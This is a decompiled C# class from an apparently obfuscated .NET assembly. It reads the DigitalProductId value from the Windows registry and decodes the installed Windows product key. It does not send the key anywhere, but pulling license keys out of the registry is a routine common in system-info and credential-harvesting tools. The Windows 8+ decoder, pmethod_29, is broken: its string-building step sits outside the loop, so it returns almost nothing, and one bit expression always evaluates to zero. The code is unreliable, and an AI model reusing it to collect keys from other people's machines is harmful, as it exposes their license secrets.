using System;
using System.Collections;
using Microsoft.Win32;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000010 RID: 16
	internal class Class_9
	{
		// Token: 0x0600003B RID: 59 RVA: 0x000038AC File Offset: 0x00001AAC
		public static string lmethod_28(byte[] byteDizi_0)
		{
			int num = 0;
			ArrayList arrayList = new ArrayList();
			for (int i = 52; i <= 67; i++)
			{
				arrayList.Add(byteDizi_0[i]);
			}
			char[] array = new char[29];
			for (int j = 28; j >= 0; j--)
			{
				if ((j + 1) % 6 != 0)
				{
					for (int k = 14; k >= 0; k--)
					{
						arrayList[k] = (byte)((num << 8 | (int)((byte)arrayList[k])) / 24);
						num = (num << 8 | (int)((byte)arrayList[k])) % 24;
						char[] array2 = new char[]
						{
							'B',
							'C',
							'D',
							'F',
							'G',
							'H',
							'J',
							'K',
							'M',
							'P',
							'Q',
							'R',
							'T',
							'V',
							'W',
							'X',
							'Y',
							'2',
							'3',
							'4',
							'6',
							'7',
							'8',
							'9'
						};
						array[j] = array2[num];
					}
				}
				else
				{
					array[j] = '-';
				}
			}
			return new string(array);
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00003990 File Offset: 0x00001B90
		public static string pmethod_29(byte[] byteDizi_0)
		{
			string text = string.Empty;
			int num = 0;
			byteDizi_0[66] = ((byteDizi_0[66] & 247) | (byteDizi_0[66] / 6 & 1 & 2) * 4);
			for (int i = 24; i >= 0; i--)
			{
				for (int j = 14; j >= 0; j--)
				{
					num *= 256;
					num = (int)byteDizi_0[j + 52] + num;
					byteDizi_0[j + 52] = (byte)(num / 24);
					num %= 24;
				}
			}
			text = string.Format("{0}{1}", "BCDFGHJKMPQRTVWXY2346789"[num], text);
			text = text.Substring(1, 0) + "N" + text.Substring(1, text.Length - 1);
			for (int k = 5; k < text.Length; k += 6)
			{
				text = text.Insert(k, "-");
			}
			return text;
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00003A74 File Offset: 0x00001C74
		public static string smethod_30(string str_0, string str_1)
		{
			string result = string.Empty;
			RegistryHive hKey = Class_104.IsAdmin ? RegistryHive.LocalMachine : RegistryHive.CurrentUser;
			RegistryView view = Class_104.IsWin64 ? RegistryView.Registry64 : RegistryView.Registry32;
			try
			{
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(hKey, view))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(str_0, Class_104.IsWin64))
					{
						result = (((Environment.OSVersion.Version.Major != 6 || Environment.OSVersion.Version.Minor < 2) && Environment.OSVersion.Version.Major <= 6) ? Class_9.lmethod_28((byte[])registryKey2.GetValue(str_1)) : Class_9.pmethod_29((byte[])registryKey2.GetValue(str_1)));
					}
				}
			}
			catch (Exception)
			{
				return "Unknown";
			}
			return result;
		}
	}
}
